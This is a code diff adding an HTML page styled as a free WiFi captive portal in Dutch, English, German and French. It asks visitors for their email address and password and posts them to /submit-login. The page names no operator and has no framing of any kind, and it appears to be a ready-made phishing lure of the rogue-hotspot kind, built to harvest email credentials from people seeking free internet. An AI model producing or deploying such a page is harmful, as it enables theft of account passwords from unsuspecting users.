@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gratis WiFi Toegang</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden; /* Prevent scrolling */
+        }
+
+        .container {
+            background-color: #ffffff;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            padding: 20px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            box-sizing: border-box;
+            margin: 10px;
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 1.5em;
+        }
+
+        p {
+            color: #666;
+            margin-bottom: 20px;
+            font-size: 1em;
+        }
+
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 1em;
+        }
+
+        button {
+            background-color: #007BFF;
+            color: #fff;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 1em;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        footer {
+            margin-top: 20px;
+            color: #999;
+            font-size: 0.9em;
+        }
+
+        .language-select {
+            margin-bottom: 20px;
+        }
+
+        select {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 1em;
+            box-sizing: border-box;
+        }
+    </style>
+    <script>
+        function changeLanguage() {
+            var language = document.getElementById("language").value;
+            var elements = document.querySelectorAll("[data-lang]");
+            var emailPlaceholder = {
+                nl: "E-mailadres",
+                en: "Email",
+                de: "E-Mail",
+                fr: "Courriel"
+            };
+            var passwordPlaceholder = {
+                nl: "Wachtwoord",
+                en: "Password",
+                de: "Passwort",
+                fr: "Mot de passe"
+            };
+
+            elements.forEach(function (element) {
+                element.style.display = element.getAttribute("data-lang") === language ? "block" : "none";
+            });
+
+            // Update placeholders based on selected language
+            document.querySelector('input[name="email"]').placeholder = emailPlaceholder[language];
+            document.querySelector('input[name="password"]').placeholder = passwordPlaceholder[language];
+            document.querySelector('button[type="submit"]').innerText = {
+                nl: "Verbind",
+                en: "Connect",
+                de: "Verbinden",
+                fr: "Connecter"
+            }[language];
+        }
+    </script>
+</head>
+<body onload="changeLanguage()">
+
+<div class="container">
+    <div class="language-select">
+        <select id="language" onchange="changeLanguage()">
+            <option value="nl">Nederlands</option>
+            <option value="en">English</option>
+            <option value="de">Deutsch</option>
+            <option value="fr">Français</option>
+        </select>
+    </div>
+
+    <!-- Nederlands -->
+    <div data-lang="nl">
+        <h1>Welkom bij Gratis WiFi</h1>
+        <p>Vul uw e-mailadres en wachtwoord in om toegang te krijgen tot ons netwerk.</p>
+    </div>
+
+    <!-- Engels -->
+    <div data-lang="en">
+        <h1>Welcome to Free WiFi</h1>
+        <p>Enter your email address and password to access our network.</p>
+    </div>
+
+    <!-- Duits -->
+    <div data-lang="de">
+        <h1>Willkommen beim kostenlosen WLAN</h1>
+        <p>Geben Sie Ihre E-Mail-Adresse und Ihr Passwort ein, um auf unser Netzwerk zuzugreifen.</p>
+    </div>
+
+    <!-- Frans -->
+    <div data-lang="fr">
+        <h1>Bienvenue au WiFi Gratuit</h1>
+        <p>Entrez votre adresse e-mail et mot de passe pour accéder à notre réseau.</p>
+    </div>
+
+    <form action="/submit-login" method="post">
+        <input type="email" name="email" placeholder="E-mailadres" required>
+        <input type="password" name="password" placeholder="Wachtwoord" required>
+        <button type="submit">Verbind</button>
+    </form>
+    <footer>
+        &copy; 2024 Gratis WiFi Service
+    </footer>
+</div>
+
+</body>
+</html>
